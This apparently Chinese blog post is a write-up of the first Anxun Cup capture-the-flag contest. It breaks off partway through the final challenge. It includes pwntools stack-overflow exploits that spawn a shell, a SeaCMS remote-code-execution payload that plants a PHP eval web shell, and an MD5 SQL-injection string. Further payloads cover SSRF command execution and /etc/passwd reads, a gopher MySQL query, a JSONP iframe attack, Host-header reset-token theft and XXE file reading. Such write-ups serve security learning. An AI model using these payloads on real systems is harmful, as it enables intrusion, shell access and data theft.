    <link href="http://www.cuittk.cn/2018/11/27/%E7%AC%AC%E4%B8%80%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AFwriteup/"/>
    <id>http://www.cuittk.cn/2018/11/27/第一届安洵杯writeup/</id>
    <published>2018-11-27T09:01:28.667Z</published>
    <updated>2018-11-27T10:01:09.974Z</updated>
    
    <content type="html"><![CDATA[<h2 id="第一届安洵杯writeup"><a href="#第一届安洵杯writeup" class="headerlink" title="第一届安洵杯writeup"></a>第一届安洵杯writeup</h2><p>线上赛混个第三名，跟着大佬们，躺进下线赛了。</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="这里是签到题"><a href="#这里是签到题" class="headerlink" title="这里是签到题"></a>这里是签到题</h4><p>应高数高分大佬要求，签到题为下图：<br><a href="https://i.loli.net/2018/11/23/5bf7fef997715.jpg" target="_blank" rel="external">https://i.loli.net/2018/11/23/5bf7fef997715.jpg</a><br>md5小写<br>例子:D0g3{21232f297a57a5a743894a0e4a801fc3}<br>格式<br>D0g3{md5(幺元)}<br><a href="https://zhidao.baidu.com/question/1114204049719347299.html" target="_blank" rel="external">https://zhidao.baidu.com/question/1114204049719347299.html</a></p><p>从最右边一列找一个元素，它所在行与表头的首行完全一致，即为左幺元，图中是c。<br>从最上边一行找一个元素，它所在列与表头的首列完全一致，即为右幺元，图中是c。<br>所以c是幺元。<br>Md5(c)= 4a8a08f09d37b73795649038408b5f33<br>D0g3{4a8a08f09d37b73795649038408b5f33}</p><h4 id="boooooom"><a href="#boooooom" class="headerlink" title="boooooom"></a>boooooom</h4><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容<br><figure class="highlight plain"><figcaption><span>zlib</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">for i in xrange(0,100000000):</div><div class="line">buf = str(i).rjust(8,&apos;0&apos;)</div><div class="line">#print buf</div><div class="line">    if zlib.crc32(buf) &amp; 0xffffffff == 0x0cd95dac:</div><div class="line">print &apos;&apos;,buf</div></pre></td></tr></table></figure></p><p><img src="http://img.cdn.cuittk.cn/eh4koonnh3tpr1hfbp8ckrd0ft.png" alt=""><br>然后再用.py跑<br><figure class="highlight plain"><figcaption><span>base64</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">import hashlib</div><div class="line">#f = open(&quot;password.txt&quot;,&apos;r&apos;)</div><div class="line">#password = f.readline()</div><div class="line">password=&apos;08646247&apos;</div><div class="line">b64_str = base64.b64encode(password.encode(&apos;utf-8&apos;))</div><div class="line">hash = hashlib.md5()</div><div class="line">hash.update(b64_str)</div><div class="line">zip_passowrd = hash.hexdigest()</div><div class="line">print(zip_passowrd)</div></pre></td></tr></table></figure></p><p> <img src="http://img.cdn.cuittk.cn/75qc8jxf3vezsbm4gx8r9u1kpr.png" alt=""><br> 再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。用tweakPNG改<br><img src="http://img.cdn.cuittk.cn/txr6xrku8v20rmtfuh2awqshh0.png" alt=""><br>修改高度为500<br><img src="http://img.cdn.cuittk.cn/zuktirc0jyodpimnl27j0qyilt.png" alt=""><br>可以看到flag了导出图片 提取文字完事。<br><img src="http://img.cdn.cuittk.cn/a559qosl4bhs3vt4fa8n5gf340.png" alt=""><br>D0g3{a184929e2c170e2b7dc12eb3106f0a16}</p><h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="Hiahiahia"><a href="#Hiahiahia" class="headerlink" title="Hiahiahia"></a>Hiahiahia</h4><p>入门pwn，栈溢出到arg[0]<br>check一下，有NX和canary<br><img src="http://img.cdn.cuittk.cn/xxpcms93hip2pmrl667php7tu7.png" alt=""><br>Gdb调试下<br><img src="http://img.cdn.cuittk.cn/5ygnuyenrduc8j4v7mc2ku1aqy.png" alt=""><br><img src="http://img.cdn.cuittk.cn/fnw9ls4b9q5v12t40qsmcba35l.png" alt=""><br>找到flag和arg[0]的地址算一下偏移<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line">old_flag_addr = 0x4007a8</div><div class="line">new_flag_addr = 0x6007a8</div><div class="line">p = remote(&apos;149.248.7.48&apos;, 8888)</div><div class="line">p.recvuntil(&quot;Please find the flag!&quot;)</div><div class="line">#gdb.attach(p)</div><div class="line">#payload = &quot;a&quot;*0x218 + p64(new_flag_addr)</div><div class="line">payload = &apos;a&apos;* 360 + p64(old_flag_addr)</div><div class="line">p.sendline(payload)</div><div class="line">flag = p.recv()</div><div class="line">print flag</div></pre></td></tr></table></figure></p><p>flag:D0g3{ccc_y0u_again<em>hiahiahia</em>}</p><h4 id="neko"><a href="#neko" class="headerlink" title="neko"></a>neko</h4><p>栈溢出，有system地址，leak libc。。。。<br>去libcdb查版本  然后基本操作栈溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python</div><div class="line">from pwn import *</div><div class="line">EXE = &quot;./neko&quot;</div><div class="line">e = ELF(EXE)</div><div class="line">libc = e.libc</div><div class="line">io = remote(&apos;149.248.7.48&apos;,9999)</div><div class="line">system = e.plt[&quot;system&quot;]</div><div class="line">puts = e.plt[&quot;puts&quot;]</div><div class="line">puts_got = e.got[&quot;puts&quot;]</div><div class="line">io.sendlineafter(&quot;cats?\n&quot;,&apos;y&apos;)</div><div class="line">payload = &quot;a&quot; * 0xd4</div><div class="line">payload += p32(puts)</div><div class="line">payload += p32(0x080486E7)</div><div class="line">payload += p32(puts_got)</div><div class="line">io.sendafter(&quot;anchovies:\n&quot;,payload)</div><div class="line">io.recvline()</div><div class="line">base = u32(io.recv(4)) - 0x05f140</div><div class="line">binsh = base + 0x15902b</div><div class="line">payload = &quot;a&quot; * 0xd4</div><div class="line">payload += p32(system)</div><div class="line">payload += p32(binsh) * 2</div><div class="line">io.sendafter(&quot;anchovies:\n&quot;,payload)</div><div class="line">io.interactive()</div></pre></td></tr></table></figure></p><p>flag: D0g3{Wh0_Doe5n’t_1ik3_k1tt3ns??}</p><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="web1-无限手套"><a href="#web1-无限手套" class="headerlink" title="web1-无限手套"></a>web1-无限手套</h4><p>提示输入NOHO<br>测出来要求在7399999999到7400000000<br><a href="http://222.18.158.227:10580/?NOHO[]=d" target="_blank" rel="external">http://222.18.158.227:10580/?NOHO[]=d</a>  数组绕过<br><img src="http://img.cdn.cuittk.cn/scsp2dkgdl6m98ddphx4um0u23.png" alt=""><br>输密码<br><!--SELECT master FROM secret WHERE password = binary '!#/)zW��C�JJ�¬�'--><br>发现是MD5加密后16进制转字符<br>md5(admin,32) = 21232f297a57a5a743894a0e4a801fc3<br><img src="http://img.cdn.cuittk.cn/zfax8venhi8p80mrbheujok8iw.png" alt=""><br>想到了md5加密后再16进制转字符串后有单引号引起sql注入。以前做过md5 sql注入。<br><a href="http://222.18.158.227:10580/?NOHO[]=123" target="_blank" rel="external">http://222.18.158.227:10580/?NOHO[]=123</a><br>POST：password=ffifdyop<br>ffifdyop md5()加密-》276f722736c95d99e921722cf9ed621c -》再16进制转字符串为’or’6?]??!r,??b<br><img src="http://img.cdn.cuittk.cn/njplvqgr69od24j4iy4f87y5e9.png" alt=""><br>得到flag:<br>e5e8b79aeb213ad6e0e4664e78aff61b<br>D0g3{e5e8b79aeb213ad6e0e4664e78aff61b}</p><h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><p>Find The d0g3.php In Intranets<br><a href="http://222.18.158.227:10180/" target="_blank" rel="external">http://222.18.158.227:10180/</a><br>点了几个图后输入name提交后为<br><a href="http://222.18.158.227:10180/?url=111" target="_blank" rel="external">http://222.18.158.227:10180/?url=111</a><br>有url，提示<br><img src="http://img.cdn.cuittk.cn/c413huby44pld2eaor1160bt0g.png" alt=""><br>The Intranets are in range 10.10.1.0/16<br>那么d0g3.php就应该在内网<br>那就从10.10.1.1开始找<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.1/d0g3.php" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.1/d0g3.php</a><br><a href="http://222.18.158.227:10180/?url=http://10.10.1.3/d0g3.php" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.3/d0g3.php</a> 返回404<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php</a><br>找到了，在<a href="http://10.10.1.6/d0g3.php有200回显了" target="_blank" rel="external">http://10.10.1.6/d0g3.php有200回显了</a><br><img src="http://img.cdn.cuittk.cn/f8w4p8w8rb43g4xo8t9rc7k8x5.png" alt=""><br>提示GET d0g3参数。<br>尝试了<a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo(" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo(</a>);<br>发现是个官方shell<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo</a> `ls`;<br>打印当前目录，发现flag.txt<br>直接读<br><a href="http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo" target="_blank" rel="external">http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo</a> `cat flag.txt`;<br>D0g3{SSRF_Is_So_Easy}</p><h4 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h4><p><a href="http://138.68.2.14/seacms/" target="_blank" rel="external">http://138.68.2.14/seacms/</a><br>查找poc getshell<br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a><br><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br>post:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</div></pre></td></tr></table></figure></p><p>那就写shell吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&apos;a.php&apos;,&apos;&lt;?php%20@eval($_POST[c])?&gt;&apos;);</div></pre></td></tr></table></figure></p><p>提示.git泄露，用工具读出源码吧<br>\data\ common.inc.php有配置信息<br><img src="http://img.cdn.cuittk.cn/raufsc6qc3tvgaufza9ejv9r4q.png" alt=""><br>菜刀直接连接数据库读取flag<br><img src="http://img.cdn.cuittk.cn/tmtqb7u3ljxderi2cikhly6nu3.png" alt=""><br><img src="http://img.cdn.cuittk.cn/wnwo12srba5ahfigcjma3e1ksm.png" alt=""><br>RDBnM3tUaGlzX2lzX3JlYWxfZmxhZ30=<br>Base64解码：D0g3{This_is_real_flag}<br>我要吐槽一下，出题人是想考什么？改了两次题。<br>第一次题目的时候还有360防护……要我绕360吗？<br>昨天晚上还是138.68.2.14/。上传shell后，数据库中没有flag数据库，D0g3数据库中也没有flag信息。/www/wwwroot/的shell目录中有.user.ini文件限制，我在绕open_basedir。但是也只能用glob伪协议读目录。但是flag数据库目录在/www/server/data/flag还有在 /www/backup/database/下有备份文件flag。也没研究过怎么在没有系统命令下还要绕open_basedir读文件。</p><h4 id="BOOM"><a href="#BOOM" class="headerlink" title="BOOM"></a>BOOM</h4><p>御剑扫目录<br>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="http://img.cdn.cuittk.cn/8z8m7k6xve1m7w06foqp8yonoe.png" alt=""><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。<br><img src="http://img.cdn.cuittk.cn/5emtatwmjc1y8xozdk1zkumnm6.png" alt=""><br>登录拿flag<br><img src="http://img.cdn.cuittk.cn/tuux0wijxfj38mvrv4b9hr4cmc.png" alt=""><br>D0g3{70e052657cb40cf142883abaff266fee}</p><h4 id="webN"><a href="#webN" class="headerlink" title="webN"></a>webN</h4><p>首页一个SRC界面，没什么用<br><img src="http://img.cdn.cuittk.cn/gipzyphsbjz41qjl5qz028o2pr.png" alt=""><br>点礼品中心<a href="http://222.18.158.245:6080/reward.php点击购买" target="_blank" rel="external">http://222.18.158.245:6080/reward.php点击购买</a><br><img src="http://img.cdn.cuittk.cn/a2v7ryrwqcn89b08ejw0nq2ofa.png" alt=""><br>发现用户可控jsonp<br><img src="http://img.cdn.cuittk.cn/ati2n6xmch74lrnkpkswnwd8to.png" alt=""><br>看提示some攻击，翻文章<br><a href="https://paper.tuisec.win/detail/05c9c8b3e28bd2b" target="_blank" rel="external">https://paper.tuisec.win/detail/05c9c8b3e28bd2b</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/169873.html</a><br>点礼品中心<a href="http://222.18.158.245:6080/reward.php点击购买" target="_blank" rel="external">http://222.18.158.245:6080/reward.php点击购买</a><br>然后还提示联系客服，思路大概就是构造exp放vps上，发客服让机器人访问，子页面通过可控jsonp对父页面操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&quot;http://222.18.158.245:6080/reward.php&quot; name=b&gt;&lt;/iframe&gt;</div><div class="line">        &lt;iframe name=a&gt;&lt;/iframe&gt;</div><div class="line">        &lt;script&gt;</div><div class="line">        window.frames[0].open(&apos;http://222.18.158.245:6080/confirm.php&apos;,&apos;a&apos;);</div><div class="line">        setTimeout(</div><div class="line">          function()&#123;</div><div class="line">            window.frames[1].location.href = &apos;http://222.18.158.245:6080/confirm.php?callback=window.opener.pay&apos;;</div><div class="line">          &#125;</div><div class="line">        ,1000);</div><div class="line">&lt;/script&gt;</div></pre></td></tr></table></figure></p><p>查日志发现flag<br><img src="http://img.cdn.cuittk.cn/ir40vl0zq47yc4bsyikqc04x9l.png" alt=""><br>D0g3{Same_Orig1n_Method_ExCute_1s_eAsy}</p><h4 id="Diglett"><a href="#Diglett" class="headerlink" title="Diglett"></a>Diglett</h4><p><a href="http://54.200.169.99:7001" target="_blank" rel="external">http://54.200.169.99:7001</a><br>查看源码：<img src="http://img.cdn.cuittk.cn/i8y0sz7ghh93sdvl6f1j9rzpps.png" alt="">提示 index.php?hu3debug=1<br><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a><br>得到php源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">    include_once &quot;config.php&quot;;</div><div class="line">    if (isset($_POST[&apos;url&apos;])&amp;&amp;!empty($_POST[&apos;url&apos;]))</div><div class="line">    &#123;</div><div class="line">        $url = $_POST[&apos;url&apos;];</div><div class="line">        if(preg_match(&apos;/file/&apos;,$url))</div><div class="line">        &#123;</div><div class="line">             echo &quot;No hacker!&quot;;</div><div class="line">             echo &quot;&lt;/br&gt;&quot;;</div><div class="line">        &#125;</div><div class="line">        $url2 = preg_replace(&apos;/file/&apos;,&apos;&apos;,$url);</div><div class="line">        $content_url = getUrlContent($url2);</div><div class="line">    &#125;</div><div class="line">    else</div><div class="line">    &#123;</div><div class="line">        $content_url = &quot;&quot;;</div><div class="line">    &#125;</div><div class="line">    if(isset($_GET[&apos;hu3debug&apos;]))</div><div class="line">    &#123;</div><div class="line">        show_source(__FILE__);</div><div class="line">    &#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>利用curl读取文件。尝试url传入：file:///127.0.0.1/etc/passwd<br>if(preg_match(‘/file/‘,$url)){echo “No hacker!”;echo “<br>“;}<br>虽然比较url是否有file关键字，但只是输出信息，没有结束。<br>$url2 = preg_replace(‘/file/‘,’’,$url);<br>preg_replace只是过滤一次file关键字，可双写绕过fifilele，得到file<br>传入POST：url=fifilele://127.0.0.1/etc/passwd<br>读config文件：url=fifilele://localhost/var/www/config.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$hosts = &quot;localhost&quot;;</div><div class="line">$dbusername = &quot;test_user&quot;;</div><div class="line">$dbpasswd = &quot;&quot;;</div><div class="line">$dbname = &quot;test&quot;;</div><div class="line">$dbport = 3306;</div><div class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</div><div class="line">function initdb($conn)</div><div class="line">&#123;</div><div class="line">$dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;</div><div class="line">if(mysqli_query($conn,$dbinit)) return 1;</div><div class="line">else return 0;</div><div class="line">&#125;</div><div class="line">function safe($url)</div><div class="line">&#123;</div><div class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</div><div class="line">if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)</div><div class="line">&#123;</div><div class="line">var_dump($tmpurl);</div><div class="line">die(&quot;&lt;h1&gt;&lt;p id=&apos;test1&apos;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);</div><div class="line">&#125;</div><div class="line">return $url;</div><div class="line">&#125;</div><div class="line">function getUrlContent($url)&#123;</div><div class="line">$url = safe($url);</div><div class="line">$url = escapeshellarg($url);</div><div class="line">$pl = &quot;curl &quot;.$url;</div><div class="line">echo $pl;</div><div class="line">$content = shell_exec($pl);</div><div class="line">return $content;</div><div class="line">&#125;</div><div class="line">initdb($conn);</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p><p>知道了mysql的配置内容 gopher一波<br>利用Gopherus工具生成exploit<br><a href="https://github.com/tarunkant/Gopherus" target="_blank" rel="external">https://github.com/tarunkant/Gopherus</a><br><img src="http://img.cdn.cuittk.cn/e6sm6gf0xiozu2qys8768d2cvj.png" alt=""><br>gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01<br><img src="http://img.cdn.cuittk.cn/se77qetu5ix56rjut92ob3z69a.png" alt=""><br>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p><h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p>不要被表象欺骗，钥匙就藏在数据包中<br><a href="http://222.18.158.227:10280/" target="_blank" rel="external">http://222.18.158.227:10280/</a><br>关键点在host Host Header欺骗<br>点忘记密码，burp抓包，把host改为自己的vps，然后看日志<br><img src="http://img.cdn.cuittk.cn/xlpf26yhm5ay8lrdtn6eo9zebq.png" alt=""><br>会发重置密码的token，有效时间有点短，所以迅速复制进去改密码，然后登admin<br>登录后有个输入框<br>随便提交抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</div></pre></td></tr></table></figure></p><p>Xml格式 应该就xxe了<br>Payload<br><img src="http://img.cdn.cuittk.cn/p84ezegrblw61rlj5xfnnpwze6.png" alt=""><br>会发重置密码的token，有效时间有点短，所以迅速复制进去改密码，然后登admin<br>登录后有个输入框<br>随便提交抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</div></pre></td></tr></table></figure></p><p>Xml格式 应该就xxe了<br>Payload<br><img src="http://img.cdn.cuittk.cn/0ojtz03oml2chmo9l5nvztvnuq.png" alt=""><br>外部实体注入  Filter协议读文件  记得base64读<br>拿到flag.php<br>PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==<br>解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</div><div class="line">echo &quot;&lt;center&gt;&lt;font size=&apos;5&apos; color=&apos;red&apos;&gt;&quot;;</div><div class="line">echo &quot;You wanna capture this flag?&quot;;</div><div class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</div><div class="line">echo &quot;Oh yes, here!&quot;;</div><div class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</div><div class="line">echo &quot;But now, &quot;;</div><div class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</div><div class="line">echo &quot;Get out!&quot;;</div><div class="line">echo &quot;&lt;/font&gt;&lt;/center&gt;&quot;;</div><div class="line">//flag: D0g3&#123;Hi_D0g3_Res3t_4nd_xXe&#125;</div></pre></td></tr></table></figure></p><h4 id="方舟计划"><a href="#方舟计划" class="headerlink" title="方舟计划"></a>方舟计划</h4><p><a href="http://222.18.158.227:10380/index.php" target="_blank" rel="external">http://222.18.158.227:10380/index.php</a><br>又是买彩票。和之前的qctf一样。也是php弱类型的锅。<br>POST传入{“action”:”buy”,”numbers”:[true,true,true,true,true,true,true]}<br>每次都能中$5000000，多买几次就能买flag了。<br>Here is your flag: 想上飞船不仅仅是有钱就够了，你还得有智慧，解出这道题，你就可以获救了：一次RSA密钥对生成中，假设p=473398606，q=451141，e=17 求解出d</p><p>python 已知p,q,e求rsa的d<br><a href="https://blog.csdn.net/zyxyzz/article/details/78205321" target="_blank" rel="external">https://blog.csdn.net/zyxyzz/article/details/78205321</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"># coding = utf-8</div><div class="line">def computeD(fn, e):</div><div class="line">    (x, y, r) = extendedGCD(fn, e)</div><div class="line">    #y maybe &lt; 0, so convert it</div><div class="line">    if y &lt; 0:</div><div class="line">        return fn + y</div><div class="line">    return y</div><div class="line">def extendedGCD(a, b):</div><div class="line">    #a*xi + b*yi = ri</div><div class="line">    if b == 0:</div><div class="line">        return (1, 0, a)</div><div class="line">    #a*x1 + b*y1 = a</div><div class="line">    x1 = 1</div><div class="line">    y1 = 0</div><div class="line">    #a*x2 + b*y2 = b</div><div class="line">    x2 = 0</div><div class="line">    y2 = 1</div><div class="line">    while b != 0:</div><div class="line">        q = a / b</div><div class="line">        #ri = r(i-2) % r(i-1)</div><div class="line">        r = a % b</div><div class="line">        a = b</div><div class="line">        b = r</div><div class="line">        #xi = x(i-2) - q*x(i-1)</div><div class="line">        x = x1 - q*x2</div><div class="line">        x1 = x2</div><div class="line">        x2 = x</div><div class="line">        #yi = y(i-2) - q*y(i-1)</div><div class="line">        y = y1 - q*y2</div><div class="line">        y1 = y2</div><div class="line">        y2 = y</div><div class="line">    return(x1, y1, a)</div><div class="line">p = 473398606</div><div class="line">q = 451141</div><div class="line">e = 17</div><div class="line">n = p * q</div><div class="line">fn = (p - 1) * (q - 1)</div><div class="line">d = computeD(fn, e)</div><div class="line">print d</div></pre></td></tr></table></figure></p><p>求得150754621171553<br>D0g3{150754621171553}</p><h4 id="Double-S"><a href="#Double-S" class="headerlink" title="Double-S"></a>Double-S</h4><p>签道题<br><a href="http://54.200.169.99:7000/" target="_blank" rel="external">http://54.200.169.99:7000/</a><br>源码泄露<a href="http://54.200.169.99:7000/www.zip代码审计" target="_blank" rel="external">http://54.200.169.99:7000/www.zip代码审计</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">ini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);</div><div 